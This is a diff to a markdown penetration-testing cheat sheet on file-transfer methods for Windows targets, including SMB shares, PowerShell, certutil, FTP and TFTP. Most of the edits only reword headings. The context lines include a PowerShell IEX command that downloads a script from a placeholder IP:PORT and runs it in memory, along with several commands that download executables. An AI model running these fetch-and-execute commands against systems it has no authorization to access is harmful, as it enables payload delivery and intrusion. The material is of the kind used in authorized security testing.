@@ -22,17 +22,16 @@ http-server [path] [options]
 
 ## SMB 
 
-- **Transfer Files `To\From` Windows with `SMB`** 
 
 ```batch
-:: Start the SMB Server
+:: Transfer Files To\From Windows with SMB
 :: -smb2support [SMB-2]
 smbserver <SHARE_NAME> <DIRECTORY>                    
 ```
 
-- **`SMB` Remote Commands**
 
 ```batch
+:: SMB Remote Commands
 :: List Share Contents
 dir \\IP\SHARE_NAME                       
 
@@ -46,7 +45,7 @@ copy FILE \\IP\SHARE_NAME\OUTPUT
 
 ## PSH
 
-- **Download && Execute without Saving**
+- **Download&Execute Without Saving**
 
 ```powershell
 powershell IEX (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/FILE.ps1')
@@ -54,16 +53,15 @@ powershell IEX (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/
 
 <br/>
 
-- **`Interactive` Powershell**
+- **`Interactive`**
 
 ```powershell
 powershell -command (New-Object System.Net.WebClient).Downloadfile('http://IP:PORT/FILE.exe','FILE.exe')
 ```
 
-- **`Non Interactive` Powershell**
+- **`Non Interactive`**
 
 ```powershell
-# If Running from PSH Wrap in Single Quotes
 echo $storageDir = $pwd > PSH.ps1
 echo $webclient = New-Object System.Net.WebClient >> PSH.ps1
 echo $url = "http://IP:PORT/FILE.exe" >> PSH.ps1
@@ -98,9 +96,9 @@ certutil -urlcache -split -f "http://IP:PORT/FILE.exe"
 
 ## FTP
 
-- **`pyftpdlib` Package Must Be Installed**
 
 ```batch
+:: Requires [pyftpdlib] Package 
 :: Start The Server
 python3 -m pyftpdlib -p 21
 
@@ -122,9 +120,9 @@ ftp -v -n -s:FTP.txt
 
 ## TFTP
 
-- **`atftp` Package Must Be Installed**
 
 ```batch
+:: Requires [atftp] Package 
 :: Create TFTP Directory
 mkdir /tftp
 chown nobody: /tftp
